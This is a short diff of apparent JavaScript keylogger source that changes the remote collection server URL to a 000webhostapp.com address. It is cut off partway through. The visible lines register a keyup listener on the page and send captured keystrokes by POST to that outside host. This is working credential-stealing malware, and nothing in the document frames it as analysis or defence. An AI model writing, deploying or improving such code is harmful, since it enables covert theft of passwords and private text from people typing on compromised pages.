@@ -1,5 +1,5 @@
 (function(){
-	var server = "http://boofdev126.ezyro.com/kl/server.php";
+	var server = "https://lanky-debris.000webhostapp.com/server.php";
 	document.addEventListener("keyup", function(e){
 		var x = new XMLHttpRequest();
 		x.open("POST", server, true);
